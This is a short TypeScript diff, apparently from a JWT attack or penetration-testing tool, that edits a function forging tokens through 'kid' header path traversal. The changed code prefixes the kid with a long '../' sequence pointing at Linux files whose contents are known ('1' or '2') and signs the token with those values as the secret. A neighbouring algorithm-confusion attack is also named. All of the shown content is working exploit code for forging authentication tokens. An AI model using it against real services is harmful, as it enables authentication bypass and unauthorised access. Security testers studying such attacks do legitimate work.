@@ -36,16 +36,17 @@ export async function algorithmConfusion(token: string, publicKey: string, symme
 export async function kidPathTraversal(token: string, signaturePayload: EKidPayload) {
     let [header, payload] = getJwtParts(token);
 
-    header.kid = signaturePayload;
+    
+    header.kid = `../../../../../../../../..${signaturePayload}`;
 
     const signatures = {
         [EKidPayload.TIMER_MIGRATION]: "1\n",
         [EKidPayload.RANDOMIZE_VA_SPACE]: "2\n"
     }
-
+    
     return await jwtSign({
         header,
         payload,
-        secretKey: signatures[signaturePayload].toString()
+        secretKey: signatures[signaturePayload]
     });
 }
